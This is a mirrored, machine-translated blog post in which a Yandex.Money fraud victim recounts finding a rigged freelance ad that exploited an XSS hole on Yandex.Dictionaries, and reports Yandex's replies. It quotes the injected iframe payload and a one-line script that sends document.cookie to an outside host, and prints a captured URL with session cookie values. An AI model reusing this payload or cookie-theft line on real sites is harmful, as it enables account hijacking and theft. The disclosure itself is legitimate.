<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How to take my money from the Yandex wallet. Part 3. XSS</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Continuation of the detective story ‚ÄúHow to take my money from the Yandex wallet‚Äù. Part 3. XSS 
 Previous parts can be found here: 
 Part 1 
 Part 2.1...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How to take my money from the Yandex wallet. Part 3. XSS</h1><div class="post__text post__text-html js-mediator-article">  <strong>Continuation of the detective story ‚ÄúHow to take my money from the Yandex wallet‚Äù.</strong>  <strong>Part 3. XSS</strong> <strong><br></strong>  <strong>Previous parts can be found here:</strong> <strong><br></strong>  <strong><a href="http://habrahabr.ru/blogs/yandex/74263/">Part 1</a></strong> <strong><br></strong>  <strong><a href="http://habrahabr.ru/blogs/yandex/74374/">Part 2.1</a></strong> <strong><br></strong>  <strong><a href="http://habrahabr.ru/blogs/yandex/74448/">Part 2.2</a></strong> <strong><br><br></strong>  <strong>Attention!</strong>  <strong>Part unexpected!</strong> <br><br>  In this part: <br><ol><li>  Freelance.ru </li><li>  XSS on Yandex.Dictionaries </li><li>  Flashback </li><li>  Answer from Yandex.Money </li><li>  Questions to Yandex </li></ol>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      <strong>Attention!</strong>  <strong>No PR and ANTIPR in the article is not meant!</strong> <br><a name="habracut"></a><br><h4>  Freelance.ru </h4><br>  I, like many habra users sometimes look for a job on various freelancing sites.  So it was today in the morning - I got up early, there was nothing to do, so I thought to look for a job with a partner.  I searched on several sites at once.  I saw one of the proposals on the website freelance.ru: <a href="http://freelance.ru/projects/20556/">‚ÄúSite redesign‚Äù</a> , and the price seems to be not bad: 8000 pv.  Give, I think I will open and look.  Something familiar flashed through the assignment, but somehow I missed it.  I began to look at the proposals for work: everyone wanted to fulfill (the people, along the way, do not read anything at all, stupidly offer their services) and only stopped a couple of comments.  One of them read: <br><blockquote>  When will you die already, spammer </blockquote><br>  Then I immediately decided to return to the top and poke at the address of the site specified in the task: <strong>[Attention!</strong>  <strong>Poke to the address is only if you use Firefox c <a href="https://addons.mozilla.org/ru/firefox/addon/722">NoScript</a> !</strong>  <strong>Why?</strong>  <strong>Read below and DO NOT poke a link at once, only after reading the entire article!</strong>  <strong>Just in case, the link was changed at the request of <a href="http://geektimes.ru/users/fstrange/" class="user_link">fstrange</a> and <a href="http://geektimes.ru/users/fata1ex/" class="user_link">fata1ex</a> ]</strong> _http: //tarandaz.ru.  Poked.  Google Chrome transferred me to a familiar site for me, but after a couple of seconds there was a redirect (I didn‚Äôt understand why he decided to do this).  I saw a blank page ... <br><br><h4>  XSS on Yandex.Dictionaries </h4><br>  In the address bar of Google Chrome there was an interesting address: <br><blockquote><pre>  http://httpz.ru/nzakazchik.gif?yandexuid=2318214601243884128;%20yp=2145906000.gp.65_084965:103_682149:1 ordinary; .;% 20yandex_login = my_name;% 20L = YVdmDX9CAABmCEt8ClVwSn8DYAdBYQAGdy1mWzEVBEAiKClFBR82Pyo + ViQ5AFxTMScSIg4HLz4UJk8DAhIfGg == 1257846938.6157.282848.2cc34301b2ce0d38049606bca0c1f5fc;% 20narod_login = my_name;% 20Session_id = 1257846940.2726.0.38263038.2: 208547497: 0.62207.1514.047497eb07f8d2e7628d5a62e9bd2bd9;% 20yabs-frequency = / 2 / IE1v08459zvKUW211I6DVcm0WGL1Kjzv08458GIPUG211I7Q07e0WGKXyarw08459oT4UW211ISaq7a0WGKXmUKz0845WVzTUW211I6UZM80WGKXFSTt07W5F000 // fGA11G46 </pre></blockquote><br>  I started looking at it and what did I see ?!  All right, variables containing the words "yandex".  Opana!  I open Firefox with NoScript, I re-follow the original link and <a href="https://addons.mozilla.org/ru/firefox/addon/722">NoScript</a> says: ‚ÄúAttention!  XSS attack prevented! ‚Äù  "Cool", I think.  I climb into the source code of the main site, I see there is such a tag: <br><blockquote><pre>  &lt;iframe src = 'http: //slovari.yandex.ru/search.xml? text = &amp; st_translate = sp% 22 &lt;script&gt; alert () &lt;/ script&gt;% 3CSCRIPT type = text / javascript src = http: // httpz .ru / zakazchikgo.js&gt; &lt;/ SCRIPT&gt; "'width =' 0 'height =' 0 'style =' display: none '&gt; &lt;/ iframe&gt; </pre></blockquote><br>  Well, I think a fig yourself!  I'm going to the URL with the js-script: there is such code: <br><blockquote><pre>  location.href = "http://httpz.ru/nzakazchik.gif?"  + document.cookie; </pre></blockquote><br>  Everything is clear!  We steal a cookie, we go on behalf of the user in his office ... <br><br><h4>  Flashback </h4><br>  Then I remember that before the money was stolen from me, I also ran through the freelancing site and already poked into such an ad and also followed the link ... Where my profile was hacked is now clear.  How to change the password - the question is more interesting.  How did you find out the payment password - even more interesting ... <br><br><h4>  Answer from Yandex.Money </h4><br>  As soon as I saw such a scheme, sperans <a href="http://geektimes.ru/users/sperans/" class="user_link">unsubscribed</a> .  She told me that this vulnerability was passed on to developers, and in such a scheme it is impossible to divert the password from Yandex.Money (at the time of writing the topic, the vulnerability is still available).  In principle, I tried various login options, but I could not get a payment password using this scheme ... <br><br><h4>  Questions to Yandex </h4><br><ol><li>  How did you ‚Äúinvestigate‚Äù?  Read the message and copypaste from the instructions? </li><li>  Why do I, the account owner, do not give any information about how to change my account password, what ip logged in, did the attackers somehow try to recover my payment password? </li><li>  Were there any attempts to enter an incorrect payment password? </li><li>  Why the payment password did not change after hacking?  (Only the account password + additional e-mail has been changed ...) </li><li>  Why is this information ‚ÄúSUPER CONFIDENTIAL‚Äù (yes, caps), which is available ONLY to Yandex and police officers ?! </li></ol><br>  I understand that if you returned the money to me - I would not be particularly concerned about these questions, but in this case the answers are important to me.  Just like the other users, I think ... <br><br>  <strong>Answers from Yandex</strong> <br><blockquote>  1. How did you ‚Äúinvestigate‚Äù?  Read the message and copypaste from the instructions? <br>  - Of course, not only.  Checked with which ip made the payment and where the money went, and then - can I get them back.  As it turns out, is it possible to return - this is confidential information.  Sometimes, by the way, it is very disappointing: in ten minutes it becomes clear that the matter is 100% for the police and we can‚Äôt do anything already - and now we‚Äôre sitting and thinking, we‚Äôll write to the user - he will decide that we didn‚Äôt do anything :( just already know the result. <br><br>  2. Why don't I, the account owner, give any information about how my account password was changed, what ip came in from, did the attackers somehow try to recover my payment password? <br>  - Because we do not send such information by e-mail.  You already in the previous topics explained it to other habrovchane. <br><br>  3. Were there any attempts to enter an incorrect payment password? <br>  - It does not matter. <br><br>  4. Why the payment password did not change after hacking?  (Only the account password + additional e-mail has been changed ...) <br>  - This is a common mode of action.  I was not in the mind of the attacker, but I suppose that he simply did not bother.  One login password has changed - and enough. <br><br>  5. Why is this information ‚ÄúSUPERCONFIDENTIAL‚Äù (yes, caps), which is available ONLY to Yandex and police officers ?! <br>  ‚ÄúI don‚Äôt even know how to explain why the information is confidential.‚Äù  That is why the name of the account holder confidential information?  And the amount of his last payment for MTS, why confidential information, maybe there are only 10 rubles, is also a secret to me? </blockquote><br><br>  <strong>If someone can help further in the unwinding (in terms of help to understand what happened after they stole the cookie) of this situation - I will be grateful!</strong> <br><br>  <strong>PS</strong> From the police department have not yet called.  I think I'll be ahead of them tomorrow ... <br><br>  <strong>UPD.</strong>  <strong>Yandex asked to convey that the payment password in case of theft a cookie is not transmitted.</strong>  <em>I want to note that I did not say that.</em>  <em>In the topic in 2 places it says that I DO NOT know how the payment password was extracted</em> <br><br>  <strong>UPD 2.</strong> As <a href="http://habrahabr.ru/blogs/yandex/74811/">reported from Yandex</a> , the vulnerability was closed. <br><br>  <strong>The next part of the story is here: <a href="http://habrahabr.ru/post/76052/">How to take my money from the Yandex wallet.</a></strong>  <strong><a href="http://habrahabr.ru/post/76052/">Part 4. So what's up with the statement ?!</a></strong> </div><p>Source: <a href="https://habr.com/ru/post/74811/">https://habr.com/ru/post/74811/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../74802/index.html">Google bought Gizmo5, threatening to create a rival Skype</a></li>
<li><a href="../74806/index.html">New interface design for the 1C: Enterprise platform</a></li>
<li><a href="../74807/index.html">Move the cursor to the Terminal</a></li>
<li><a href="../74808/index.html">lxc - native linux containers</a></li>
<li><a href="../74809/index.html">‚ÄúGrandma-online‚Äù feat. Microsoft</a></li>
<li><a href="../74812/index.html">Common mistakes when filing a tax return and how to avoid them</a></li>
<li><a href="../74813/index.html">Yandex has updated the webmaster panel design</a></li>
<li><a href="../74817/index.html">Legal hacking as a workout for the mind</a></li>
<li><a href="../74818/index.html">Google Earth 5 & KML</a></li>
<li><a href="../74823/index.html">With the largest tracker in Lithuania, removed the IP-addresses of users</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>